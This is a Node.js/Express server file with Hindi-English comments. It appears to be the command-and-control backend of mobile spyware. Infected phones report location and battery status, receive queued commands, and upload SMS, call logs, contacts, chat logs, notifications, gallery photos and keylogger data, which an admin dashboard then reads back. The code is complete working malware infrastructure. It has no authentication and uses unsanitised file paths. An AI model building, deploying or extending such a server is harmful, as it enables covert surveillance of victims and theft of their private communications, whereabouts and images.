const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETUP & STORAGE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));
// Limit badhaya taaki badi images ya heavy logs aa sakein
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// RAM me status store karne ke liye
let devicesStatus = {}; 

// --- 2. ADMIN DASHBOARD ROUTES ---
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    
    // Agar device kabhi connect nahi hua
    if (!device) return res.json({ id: id, isOnline: false });
    
    // Agar last seen 60 seconds ke andar hai to Online maano
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// --- 3. PHONE CONNECTION (PING) ---
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        // Purana command check karo
        const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

        // Values ko normalize karo
        let finalBattery = battery || level || 0;
        let isCharging = (String(charging) === "true");
        let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
        let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);

        // Status update
        devicesStatus[id] = {
            id: id,
            model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
            battery: finalBattery,
            version: version || "--",
            charging: isCharging,
            lat: currentLat,
            lon: currentLon,
            lastSeen: Date.now(),
            command: "none" // Command bhej diya, ab reset kar do
        };

        console.log(`📡 [PING] ${id} | Bat: ${finalBattery}%`);
        res.json({ status: "success", command: pendingCommand });
    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// --- 4. COMMAND SENDING ---
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    
    const id = device_id.toUpperCase().trim();
    
    // Agar device list me nahi hai to add kar lo temporarily
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
    
    let finalCommand = command === "normal" ? "loud" : command;
    devicesStatus[id].command = finalCommand;
    
    console.log(`🚀 [COMMAND] Sending '${finalCommand}' to ${id}`);
    res.json({ status: "success", command: finalCommand });
});

// --- 5. DATA UPLOAD (YE HAI MAIN LOGIC) ---
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    // Device ka Last Seen update kar do jab bhi data aaye (Live Status ke liye)
    if (devicesStatus[id]) {
        devicesStatus[id].lastSeen = Date.now();
    }

    try {
        // Data parse karo (kabhi string aata hai, kabhi object)
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // --- A. LOCATION HANDLING ---
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            
            // RAM me update karo taaki map par turant dikhe
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
                devicesStatus[id].lastSeen = Date.now();
            }
            // File me save karo
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
        }
        
        // --- B. LIST DATA (Chats, SMS, Contacts) ---
        // Yahan 'chat_logs' zaroori hai
        else if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
            let existingData = [];
            
            // Purani file padho agar hai to
            if (fs.existsSync(filePath)) {
                try { 
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    if (fileContent) existingData = JSON.parse(fileContent);
                } catch (e) {
                    console.log("Error reading old file, starting new.");
                }
            }
            
            // Naya data array banao
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            
            // 🔥 MERGE: Naya pehle + Purana baad me (Latest on Top)
            const finalData = [...newDataArray, ...existingData];

            // Size limit: Sirf last 2000 items rakho taaki file heavy na ho
            const trimmedData = finalData.slice(0, 2000); 
            
            fs.writeFileSync(filePath, JSON.stringify(trimmedData, null, 2));
            console.log(`✅ [DATA] ${type} updated for ${id}. Total items: ${trimmedData.length}`);
        } 
        
        // --- C. GENERIC DATA (Keylogger etc) ---
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// --- 6. GALLERY UPLOAD ---
app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);
    
    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) { 
            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {} 
        }
        
        // Nayi photo sabse upar
        galleryData.unshift({ 
            time: date || new Date().toLocaleString(), 
            uploadedAt: Date.now(), 
            image: image_data 
        });
        
        // Max 50 photos rakho
        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
        
        console.log(`📸 [GALLERY] Image received from ${id}`);
        res.json({ status: "success" });
    } catch (error) { 
        res.status(500).json({ error: "Failed" }); 
    }
});

// --- 7. DATA RETRIEVAL (FRONTEND KE LIYE) ---
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const type = req.params.type;
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
    
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        // Agar file nahi hai to empty array bhejo
        res.json([]);
    }
});

// Server Start
app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
